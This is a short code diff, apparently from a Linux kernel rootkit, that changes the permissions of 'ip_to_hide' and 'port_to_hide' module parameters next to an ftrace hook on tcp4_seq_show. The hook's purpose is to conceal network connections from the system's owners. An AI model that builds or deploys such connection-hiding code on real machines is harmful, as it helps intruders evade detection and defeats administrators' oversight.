@@ -9,10 +9,10 @@ void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops 
 
 // Types & other consts.
 static char *ip_to_hide = NULL;
-module_param(ip_to_hide, charp, 0);
+module_param(ip_to_hide, charp, 0600);
 
 static int port_to_hide = -1;
-module_param(port_to_hide, int, 0);
+module_param(port_to_hide, int, 0600);
 
 typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
 static unsigned long tcp4_seq_show_address; 
